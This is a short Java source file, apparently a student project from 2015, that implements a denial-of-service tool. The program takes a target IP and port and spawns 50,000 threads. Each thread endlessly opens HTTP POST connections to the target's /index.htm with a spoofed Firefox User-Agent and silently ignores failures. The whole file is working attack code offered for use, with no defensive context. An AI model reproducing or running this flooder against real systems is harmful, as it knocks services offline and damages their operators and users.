/**
 * DosAttack.java
 * @author Hrishikesh Karale
 * @id hhk9433
 * @date 05/13/2015
 * @version v1.5
 * 
 * Takes a commandLine parameter as ip address. 
 * > javac DosAttack.java
 * > java DosAttack localhost 5555
 */

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * This program is used to drain resources of the ip address provided at command
 * line by committing a dos attack on the machine.
 */
public class DosAttack implements Runnable{
	//AttomicBoolean object is created and stored with default as false.
	private AtomicBoolean atmblnObject = new AtomicBoolean();
    private URL url= null;
    private HttpURLConnection httpUrlConnObject= null;
    private String ipAddress= null;
    
    /**
     * this is the Parameterized Constructor for our class whic takes in two 
     * parameters: ip Address and port. It also sets stomicBoolean to true and 
     * creates and stores a new url object.
     * @param ip
     * @param port
     */
	DosAttack(String ip, String port) {
		atmblnObject.set(true);
		ipAddress= ip;
		//attempt to create a new url with a string and stored in url object.
		try {
			url = new URL("http://"+ip+":"+port+"/index.htm");
		}
		catch (MalformedURLException e) {
			System.out.println("Problem creating url");
			e.printStackTrace();
		}
	}
	
	/**
	 * This is the main method of our class. It created numerous threads of our
	 * class and starts them.
	 * @param args
	 */
	public static void main(String args[]) {
		for(int i=0; i<50000; i++) {
			new Thread(new DosAttack(args[0], args[1])).start();
		}
	}
	
	/**
	 * This is the overridden run method of our threaded class. This opens a 
	 * connection between our machine and machine with the ip address provided 
	 * at command prompt. It then starts various other methods which use resources 
	 * and holds them off without 
	 */
	public void run() {
		while(atmblnObject.get()) {
			//opening connection to url.
			try {
				httpUrlConnObject= (HttpURLConnection) url.openConnection();
			} catch (IOException e) {}
			
			//random httpurlConnection methods to used in attempt to use up resources
			
			httpUrlConnObject.setDoOutput(true);
			httpUrlConnObject.setDoInput(true);
			httpUrlConnObject.setUseCaches(true);
			httpUrlConnObject.setIfModifiedSince(9);
			try {
				httpUrlConnObject.setRequestMethod("POST");
			} catch (ProtocolException e) {}
			httpUrlConnObject.setRequestProperty("Host", ipAddress);
			httpUrlConnObject.setRequestProperty("charset", "utf-8");
			httpUrlConnObject.setRequestProperty("User-Agent", "Mozilla/5.0 "
					+ "(Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
			httpUrlConnObject.setRequestProperty("Content-Type",
					"application/x-www-form-urlencoded");
			try {
				System.out.println(this+" "+httpUrlConnObject.getResponseCode());
			} catch (IOException e) {}
			try {
				httpUrlConnObject.getInputStream();
			} catch (IOException e) {}
		}           
	}
}

